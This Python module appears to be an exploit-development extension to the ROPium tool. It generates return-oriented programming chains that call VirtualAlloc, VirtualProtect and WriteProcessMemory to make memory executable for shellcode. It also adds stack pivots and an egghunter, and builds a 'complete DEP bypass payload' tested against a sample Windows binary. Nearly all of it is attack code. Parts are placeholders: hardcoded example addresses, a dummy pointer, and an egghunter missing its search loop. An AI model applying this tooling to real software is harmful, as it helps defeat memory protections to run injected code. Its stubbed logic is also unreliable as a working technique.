#!/usr/bin/env python3
"""
Extended RopChainer for DEP bypass functionality

This module extends the basic RopChainer with support for:
- VirtualAlloc chain generation
- VirtualProtect chain generation  
- WriteProcessMemory chain generation
- Pivot gadget insertion
- Egghunter gadget insertion

Author: ROPium Extension
"""

import sys
sys.path.insert(0, './bin')

try:
    from ropium import *
    ROPIUM_AVAILABLE = True
except ImportError:
    print("Warning: ROPium not available, using mock implementation")
    ROPIUM_AVAILABLE = False
    
    # Mock classes for testing without ROPium
    class ARCH:
        X86 = 0
        X64 = 1
    
    class ABI:
        X86_STDCALL = 0
        X86_CDECL = 1
        
    class OS:
        WINDOWS = 0
        LINUX = 1
    
    class MockChain:
        def __init__(self, description):
            self.description = description
            
        def dump(self, format_type=''):
            return f"Mock ROP Chain: {self.description}"
            
        def add_chain(self, other):
            self.description += f" + {other.description}"
    
    class MockROPium:
        def __init__(self, arch):
            self.arch = arch
            self.bad_bytes = []
            self.keep_regs = []
            self.safe_mem = False
            self.abi = None
            self.os = None
            
        def load(self, path):
            print(f"Mock: Loading binary {path}")
            
        def load_rp(self, path):
            print(f"Mock: Loading gadgets {path}")
            
        def compile(self, instruction):
            return MockChain(f"Compiled: {instruction}")


class DEPBypassChainer:
    """
    Extended ROP chainer for DEP bypass functionality
    """
    
    def __init__(self, arch=None):
        if arch is None:
            arch = ARCH.X86
            
        if ROPIUM_AVAILABLE:
            self.rop = ROPium(arch)
        else:
            self.rop = MockROPium(arch)
            
        self.arch = arch
        self.loaded = False
        
    def load_binary(self, binary_path):
        """Load a binary file for gadget extraction"""
        try:
            self.rop.load(binary_path)
            self.loaded = True
            print(f"Loaded binary: {binary_path}")
        except Exception as e:
            print(f"Failed to load binary {binary_path}: {e}")
            
    def load_gadgets(self, gadget_file):
        """Load precomputed gadgets from ROPgadget output"""
        try:
            self.rop.load_rp(gadget_file)
            self.loaded = True
            print(f"Loaded gadgets: {gadget_file}")
        except Exception as e:
            print(f"Failed to load gadgets {gadget_file}: {e}")
        
    def set_constraints(self, bad_bytes=None, keep_regs=None, safe_mem=False, abi=None, os_type=None):
        """Set ROP compilation constraints"""
        if bad_bytes:
            self.rop.bad_bytes = bad_bytes
        if keep_regs is not None:
            self.rop.keep_regs = keep_regs
        self.rop.safe_mem = safe_mem
        if abi is not None:
            self.rop.abi = abi
        if os_type is not None:
            self.rop.os = os_type
    
    def generate_virtualalloc_chain(self, size=0x1000, protection=0x40, virtualalloc_addr=None):
        """
        Generate ROP chain for VirtualAlloc call
        
        VirtualAlloc(
            LPVOID lpAddress,       // NULL (0) - let system choose
            SIZE_T dwSize,          // size of allocation  
            DWORD flAllocationType, // MEM_COMMIT | MEM_RESERVE = 0x3000
            DWORD flProtect         // PAGE_EXECUTE_READWRITE = 0x40
        )
        
        Args:
            size: Size of memory to allocate (default: 4096 bytes)
            protection: Memory protection flags (default: 0x40 = PAGE_EXECUTE_READWRITE)
            virtualalloc_addr: Address of VirtualAlloc function (auto-detected if None)
            
        Returns: ROP chain for VirtualAlloc call
        """
        if virtualalloc_addr is None:
            # Default VirtualAlloc address in kernel32.dll (example)
            virtualalloc_addr = 0x77e564d1
        
        try:
            # Create function call using ROPium's function syntax
            # VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            instruction = f'{virtualalloc_addr}(0, {size}, 0x3000, {protection})'
            chain = self.rop.compile(instruction)
            
            if chain:
                print(f"Generated VirtualAlloc chain: size={hex(size)}, protection={hex(protection)}")
                return chain
            else:
                print("VirtualAlloc chain generation failed - no suitable gadgets found")
                return None
                
        except Exception as e:
            print(f"VirtualAlloc chain generation failed: {e}")
            return None
    
    def generate_virtualprotect_chain(self, address, size, new_protection=0x40, virtualprotect_addr=None, old_protect_ptr=None):
        """
        Generate ROP chain for VirtualProtect call
        
        VirtualProtect(
            LPVOID lpAddress,       // Address to change protection
            SIZE_T dwSize,          // Size of region
            DWORD flNewProtect,     // New protection (PAGE_EXECUTE_READWRITE = 0x40)
            PDWORD lpflOldProtect   // Pointer to old protection value
        )
        
        Args:
            address: Address of memory to change protection
            size: Size of memory region
            new_protection: New protection flags (default: 0x40 = PAGE_EXECUTE_READWRITE)
            virtualprotect_addr: Address of VirtualProtect function (auto-detected if None)
            old_protect_ptr: Pointer to store old protection (auto-assigned if None)
            
        Returns: ROP chain for VirtualProtect call
        """
        if virtualprotect_addr is None:
            # Default VirtualProtect address in kernel32.dll (example)
            virtualprotect_addr = 0x77e56821
            
        if old_protect_ptr is None:
            # Use a writable memory location to store old protection
            old_protect_ptr = 0x12345678
        
        try:
            # Create function call
            instruction = f'{virtualprotect_addr}({address}, {size}, {new_protection}, {old_protect_ptr})'
            chain = self.rop.compile(instruction)
            
            if chain:
                print(f"Generated VirtualProtect chain: addr={hex(address)}, size={hex(size)}, protection={hex(new_protection)}")
                return chain
            else:
                print("VirtualProtect chain generation failed - no suitable gadgets found")
                return None
                
        except Exception as e:
            print(f"VirtualProtect chain generation failed: {e}")
            return None
    
    def generate_writeprocessmemory_chain(self, process_handle, base_address, buffer, size, writeprocessmemory_addr=None, bytes_written_ptr=None):
        """
        Generate ROP chain for WriteProcessMemory call
        
        WriteProcessMemory(
            HANDLE hProcess,               // Handle to process (usually -1 for current)
            LPVOID lpBaseAddress,          // Address to write to
            LPCVOID lpBuffer,              // Buffer containing data
            SIZE_T nSize,                  // Number of bytes to write
            SIZE_T *lpNumberOfBytesWritten // Pointer to variable that receives bytes written
        )
        
        Args:
            process_handle: Handle to target process (-1 for current process)
            base_address: Address to write to
            buffer: Address of buffer containing data to write
            size: Number of bytes to write
            writeprocessmemory_addr: Address of WriteProcessMemory function (auto-detected if None)
            bytes_written_ptr: Pointer to store bytes written count (auto-assigned if None)
            
        Returns: ROP chain for WriteProcessMemory call
        """
        if writeprocessmemory_addr is None:
            # Default WriteProcessMemory address in kernel32.dll (example)
            writeprocessmemory_addr = 0x77e55e12
            
        if bytes_written_ptr is None:
            # Use a writable memory location to store bytes written
            bytes_written_ptr = 0x12345678
        
        try:
            # Create function call
            instruction = f'{writeprocessmemory_addr}({process_handle}, {base_address}, {buffer}, {size}, {bytes_written_ptr})'
            chain = self.rop.compile(instruction)
            
            if chain:
                print(f"Generated WriteProcessMemory chain: handle={process_handle}, addr={hex(base_address)}, size={hex(size)}")
                return chain
            else:
                print("WriteProcessMemory chain generation failed - no suitable gadgets found")
                return None
                
        except Exception as e:
            print(f"WriteProcessMemory chain generation failed: {e}")
            return None
    
    def insert_pivot_gadget(self, current_chain, target_buffer_address):
        """
        Insert a stack pivot gadget to redirect execution to another buffer
        
        This is useful for splitting ROP chains across multiple buffers when
        buffer space is limited.
        
        Args:
            current_chain: Existing ROP chain to extend
            target_buffer_address: Address of the target buffer to pivot to
            
        Returns: Modified chain with pivot gadget
        """
        try:
            # Create a stack pivot: mov esp, target_address
            # This will redirect the stack pointer to the target buffer
            pivot_instruction = f'esp = {target_buffer_address}'
            pivot_chain = self.rop.compile(pivot_instruction)
            
            if pivot_chain and current_chain:
                if hasattr(current_chain, 'add_chain'):
                    current_chain.add_chain(pivot_chain)
                    print(f"Inserted stack pivot to {hex(target_buffer_address)}")
                else:
                    print("Warning: Chain object doesn't support add_chain method")
                    
            return current_chain
            
        except Exception as e:
            print(f"Pivot gadget insertion failed: {e}")
            return current_chain
    
    def insert_egghunter(self, egg_signature=0x50905090, search_start=0x00010000):
        """
        Generate egghunter ROP chain to search for shellcode marked with egg signature
        
        An egghunter is a small piece of code that searches memory for a specific
        signature (egg) and then jumps to the code immediately following that signature.
        This is useful when you have limited buffer space for your ROP chain.
        
        Args:
            egg_signature: 4-byte signature to search for (default: 0x50905090)
            search_start: Memory address to start searching from (default: 0x00010000)
            
        Returns: ROP chain that implements egghunter functionality
        """
        try:
            # Basic egghunter implementation using ROP
            # This is a simplified version - a real egghunter would involve loops
            
            chains = []
            
            # Set up search parameters
            # Load search start address into a register
            search_chain = self.rop.compile(f'ebx = {search_start}')
            if search_chain:
                chains.append(search_chain)
                print(f"Set search start address: {hex(search_start)}")
            
            # Load egg signature for comparison
            egg_chain = self.rop.compile(f'eax = {egg_signature}')
            if egg_chain:
                chains.append(egg_chain)
                print(f"Set egg signature: {hex(egg_signature)}")
            
            # In a real implementation, you would add:
            # 1. Memory read gadgets to read from [ebx]
            # 2. Comparison gadgets to compare with eax
            # 3. Conditional jump gadgets to loop or continue
            # 4. Increment gadgets to move to next memory location
            # 5. Jump gadget to found shellcode location
            
            # Combine all chains
            if chains:
                main_chain = chains[0]
                for chain in chains[1:]:
                    if hasattr(main_chain, 'add_chain'):
                        main_chain.add_chain(chain)
                        
                print("Generated basic egghunter chain structure")
                return main_chain
            else:
                print("Egghunter chain generation failed - no suitable gadgets found")
                return None
                
        except Exception as e:
            print(f"Egghunter generation failed: {e}")
            return None
    
    def create_dep_bypass_payload(self, shellcode_addr, shellcode_size):
        """
        Create a complete DEP bypass payload combining multiple techniques
        
        Args:
            shellcode_addr: Address where shellcode will be placed
            shellcode_size: Size of shellcode
            
        Returns: Complete ROP chain for DEP bypass
        """
        print("=== Creating Complete DEP Bypass Payload ===")
        
        # Step 1: Allocate executable memory with VirtualAlloc
        print("\nStep 1: Allocating executable memory...")
        va_chain = self.generate_virtualalloc_chain(size=shellcode_size, protection=0x40)
        
        if not va_chain:
            # Fallback: Try VirtualProtect on existing memory
            print("VirtualAlloc failed, trying VirtualProtect fallback...")
            vp_chain = self.generate_virtualprotect_chain(
                address=shellcode_addr,
                size=shellcode_size,
                new_protection=0x40
            )
            if vp_chain:
                print("DEP bypass chain created using VirtualProtect")
                return vp_chain
            else:
                print("Both VirtualAlloc and VirtualProtect failed")
                return None
        
        # Step 2: Optionally copy shellcode using WriteProcessMemory
        print("\nStep 2: Copying shellcode to executable memory...")
        wpm_chain = self.generate_writeprocessmemory_chain(
            process_handle=-1,  # Current process
            base_address=shellcode_addr,
            buffer=shellcode_addr + 0x1000,  # Assume shellcode is at offset
            size=shellcode_size
        )
        
        if wpm_chain and hasattr(va_chain, 'add_chain'):
            va_chain.add_chain(wpm_chain)
            
        print("Complete DEP bypass payload created")
        return va_chain


def test_dep_bypass_functionality():
    """Test function demonstrating all DEP bypass capabilities"""
    print("=== Testing DEP Bypass Functionality ===\n")
    
    # Create chainer instance
    chainer = DEPBypassChainer(ARCH.X86)
    
    # Set up constraints for Windows x86 environment
    chainer.set_constraints(
        bad_bytes=[0x00, 0x0a, 0x0d, 0x20],  # NULL, LF, CR, SPACE
        keep_regs=[],
        safe_mem=False,
        abi=ABI.X86_STDCALL,
        os_type=OS.WINDOWS
    )
    
    # Try to load binary or gadgets
    print("1. Loading binary/gadgets...")
    try:
        chainer.load_binary('./samples/binaries/efssetup.exe')
    except:
        print("   Binary loading failed, proceeding with available gadgets...")
    
    # Test VirtualAlloc chain generation
    print("\n2. Testing VirtualAlloc chain generation...")
    va_chain = chainer.generate_virtualalloc_chain(size=0x1000, protection=0x40)
    if va_chain:
        print("   ✓ VirtualAlloc chain generated successfully")
        print(f"   Chain preview: {va_chain.dump()}")
    else:
        print("   ✗ VirtualAlloc chain generation failed")
    
    # Test VirtualProtect chain generation
    print("\n3. Testing VirtualProtect chain generation...")
    vp_chain = chainer.generate_virtualprotect_chain(
        address=0x12340000,
        size=0x1000,
        new_protection=0x40
    )
    if vp_chain:
        print("   ✓ VirtualProtect chain generated successfully")
        print(f"   Chain preview: {vp_chain.dump()}")
    else:
        print("   ✗ VirtualProtect chain generation failed")
    
    # Test WriteProcessMemory chain generation
    print("\n4. Testing WriteProcessMemory chain generation...")
    wpm_chain = chainer.generate_writeprocessmemory_chain(
        process_handle=-1,
        base_address=0x12340000,
        buffer=0x12341000,
        size=0x100
    )
    if wpm_chain:
        print("   ✓ WriteProcessMemory chain generated successfully")
        print(f"   Chain preview: {wpm_chain.dump()}")
    else:
        print("   ✗ WriteProcessMemory chain generation failed")
    
    # Test pivot gadget insertion
    print("\n5. Testing pivot gadget insertion...")
    if va_chain:
        pivoted_chain = chainer.insert_pivot_gadget(va_chain, 0x12345000)
        if pivoted_chain:
            print("   ✓ Pivot gadget inserted successfully")
        else:
            print("   ✗ Pivot gadget insertion failed")
    else:
        print("   - Skipping (no base chain available)")
    
    # Test egghunter generation
    print("\n6. Testing egghunter generation...")
    egg_chain = chainer.insert_egghunter(egg_signature=0x50905090)
    if egg_chain:
        print("   ✓ Egghunter chain generated successfully")
        print(f"   Chain preview: {egg_chain.dump()}")
    else:
        print("   ✗ Egghunter chain generation failed")
    
    # Test complete DEP bypass payload
    print("\n7. Testing complete DEP bypass payload generation...")
    complete_chain = chainer.create_dep_bypass_payload(
        shellcode_addr=0x12340000,
        shellcode_size=0x200
    )
    if complete_chain:
        print("   ✓ Complete DEP bypass payload generated successfully")
        print(f"   Complete chain preview: {complete_chain.dump()}")
    else:
        print("   ✗ Complete DEP bypass payload generation failed")
    
    print("\n=== DEP Bypass Functionality Test Complete ===")


def print_usage():
    """Print usage information for the extended RopChainer"""
    print("""
Extended RopChainer for DEP Bypass - Usage Examples
==================================================

1. Basic Usage:
   from RopChainerExtended import DEPBypassChainer, ARCH, ABI, OS
   
   chainer = DEPBypassChainer(ARCH.X86)
   chainer.load_binary('./binary.exe')
   chainer.set_constraints(bad_bytes=[0x00, 0x0a], abi=ABI.X86_STDCALL)

2. VirtualAlloc Chain:
   chain = chainer.generate_virtualalloc_chain(size=0x1000, protection=0x40)

3. VirtualProtect Chain:
   chain = chainer.generate_virtualprotect_chain(address=0x401000, size=0x1000)

4. WriteProcessMemory Chain:
   chain = chainer.generate_writeprocessmemory_chain(-1, 0x401000, 0x402000, 0x100)

5. Pivot Gadgets:
   chainer.insert_pivot_gadget(existing_chain, target_buffer_address)

6. Egghunter:
   hunter_chain = chainer.insert_egghunter(egg_signature=0x50905090)

7. Complete DEP Bypass:
   full_chain = chainer.create_dep_bypass_payload(shellcode_addr, shellcode_size)

For more information, see the individual method documentation.
""")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print_usage()
    else:
        # Run the test function
        test_dep_bypass_functionality()